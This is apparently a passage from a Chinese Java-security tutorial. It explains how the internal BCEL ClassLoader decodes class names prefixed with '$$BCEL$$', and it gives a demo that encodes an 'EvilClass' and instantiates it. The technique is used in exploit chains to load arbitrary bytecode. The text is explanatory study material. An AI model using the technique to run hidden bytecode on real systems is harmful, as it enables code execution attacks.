`com.sun.org``.apache.bcel.internal.util.ClassLoader`类中重写了`java.lang.ClassLoader`中的`loadClass`方法，从下面重写的`loadClass`源码中可以看到有对类名是否是以`$$BCEL$$`开头的判断，如果是的话则会调用`com.sun.org``.apache.bcel.internal.util.ClassLoader#createClass`方法，进一步触发`Utility#`*`decode`**方法。*

```Java
protected Class loadClass(String class_name, boolean resolve)
  throws ClassNotFoundException
{
  Class cl = null;

  /* First try: lookup hash table.
   */
  if((cl=(Class)classes.get(class_name)) == null) {
    /* Second try: Load system class using system class loader. You better
     * don't mess around with them.
     */
    for(int i=0; i < ignored_packages.length; i++) {
      if(class_name.startsWith(ignored_packages[i])) {
        cl = deferTo.loadClass(class_name);
        break;
      }
    }

    if(cl == null) {
      JavaClass clazz = null;

      /* Third try: Special request?
       */
      if(class_name.indexOf("$$BCEL$$") >= 0)
        clazz = createClass(class_name);
      else { // Fourth try: Load classes via repository
        if ((clazz = repository.loadClass(class_name)) != null) {
          clazz = modifyClass(clazz);
        }
        else
          throw new ClassNotFoundException(class_name);
      }

      if(clazz != null) {
        byte[] bytes  = clazz.getBytes();
        cl = defineClass(class_name, bytes, 0, bytes.length);
      } else // Fourth try: Use default class loader
        cl = Class.forName(class_name);
    }

    if(resolve)
      resolveClass(cl);
  }

  classes.put(class_name, cl);

  return cl;
}
```

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=YTY2M2E1ZmE2NWY2MjM4YWNkNjVlODBlNGUwOGFlNmJfMzBrMVpEdDBGelUxUDRtQWQzUVBEN2t3NXhTc3ZtVDFfVG9rZW46Ym94Y25tVEdieWF3cm1ONTcyQkZXdGlzS1hmXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

示例代码中利用`Repository#lookupClass`方法将`Java Class`转化为原生字节码格式，接着利用`Utility#encode`将原生字节码转换成`BCEL`格式的字节码，最后调用`com.sun.org``.apache.bcel.internal.util.ClassLoader#loadClass`再实例化。

```Java
package com.security;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;

import java.io.IOException;
import java.util.Arrays;

public class BCELClassLoaderDemo {

    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException {

        JavaClass clazz = Repository.lookupClass(EvilClass.class);
        String code = Utility.encode(clazz.getBytes(), true);

        new ClassLoader().loadClass("$$BCEL$$" + code).newInstance();
    }
}
```

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=MTNkOGIwZGIxYzAyY2VhOWQ0NWFmZTI5ODE3ZDkzMWFfREI2bGpEVWhVWFFnYVNCckFpR1pUYTRJbWlpZElNUzFfVG9rZW46Ym94Y25tMkpSMW1GZW55cktrUmxvVU16RGliXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

需要注意的是，在`8u251`及之后的JDK版本中，`com.sun.org``.apache.bcel.internal.util.ClassLoader` 这个类被移除了。

# 参考

- [ClassLoader（类加载机制）](https://javasec.org/javase/ClassLoader/)

- [BCEL ClassLoader去哪了](https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html)

- Java安全漫谈 - 13.Java中动态加载字节码的那些方法 